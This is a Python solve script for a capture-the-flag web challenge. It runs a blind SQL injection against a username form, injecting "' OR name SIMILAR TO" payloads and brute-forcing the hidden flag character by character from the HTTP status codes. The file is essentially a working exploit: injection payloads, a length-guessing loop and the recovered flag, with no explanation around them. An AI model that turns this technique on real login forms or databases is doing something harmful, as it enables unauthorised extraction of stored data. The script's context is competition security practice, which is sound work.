import requests as req
import string
from tqdm import tqdm
import logging

allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
# forbidden_strs = ["like"]

def attempt(username):
    url = "https://penguin.chall.lac.tf/submit"
    form = {"username": username}
    resp = req.post(url, form)
    return resp.status_code, resp.content.decode()

def main():

    # Guess length
    # ------------------------------------------------
    # for i in range(20,40):
    #   payload = f"' OR name SIMILAR TO 'lactf_{'_' * i}_'"
    #   code,content = attempt(payload)
    #   print(i, code , content)
    # return

    def check(guess):
        guess = "".join(guess)
        # use _ for "{", "}" to avoid assigning escape char for this task
        payload = "' OR name SIMILAR TO 'lactf_"+guess+"_"
        code, content = attempt(payload)
        logging.debug(f"{guess} {code} {content}")
        return code == 200

    # Guess char
    # ------------------------------------------------
    length = 38
    guess = ["_"] * length
    allowed_chars.remove("'")
    allowed_chars.remove("{")
    allowed_chars.remove("}")

    for i in tqdm(range(38)):
        for ch in tqdm(allowed_chars):
            guess[i] = ch
            if check(guess):
                break
        logging.info(guess)

    # guess = ['9', '0', 's', 't', 'g', 'r', '3', '5', '_', '3', 's', '_', 'n', '0', 't', '_', 'l', '7', 'k', '3', '_', 't', 'h', '3', '_', '0', 't', 'h', '3', 'r', '_', 'd', 'b', 's', '_', '0', 'w', '0']
    
    logging.info(guess)
    logging.info(f"lactf{{{''.join(guess)}}}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # logging.basicConfig(level=logging.DEBUG)
    main()
